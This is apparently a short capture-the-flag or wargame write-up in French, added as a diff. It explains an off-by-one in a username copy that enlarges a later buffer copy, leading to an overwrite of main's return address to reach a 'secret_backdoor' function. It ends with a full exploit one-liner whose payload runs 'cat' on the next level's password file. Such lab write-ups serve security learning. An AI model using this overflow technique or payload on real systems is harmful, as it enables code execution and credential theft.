@@ -1,0 +1,11 @@
+On remarque une erreur de programmation :
+
+Le "while(i <= 0x28 && buff)" de set_username nous permet d'ecrire à 1 de plus que le buffer, bufarg->username a en effet une taille de 28. on peut donc ecrire sur le debut du champ suivant de la struct message, qui n'est autre que le nombre de caracteres qui seront copies dans set_msg.
+
+Ainsi, en ecrivant 'a' * 0x28 + '\xff', on va pouvoir ecrire 255 caracteres plus loin que la taille du buffer.
+
+On remarque que le rip de retour de main est stocké à buffer + 192, on peut donc ecrire l'adresse que l'on souhaite comme adresse de retour.
+
+On remarque également la presence de secret_backdoor (...) dans l'executable qui lit un buffer et l'execute. on peut donc faire ainsi :
+
+/home/users/level09/level09 < <(python -c "print 'a' * 0x28 + '\xff' + '\n' + 'b' * 192 + '\xd0''\xe5''\xff''\xff''\xff''\x7f''\x11''\x11' + '\x8c''\x48''\x55''\x55''\x55''\x55' + '\x00' * 2 + '\ncat /home/users/end/.pass'")
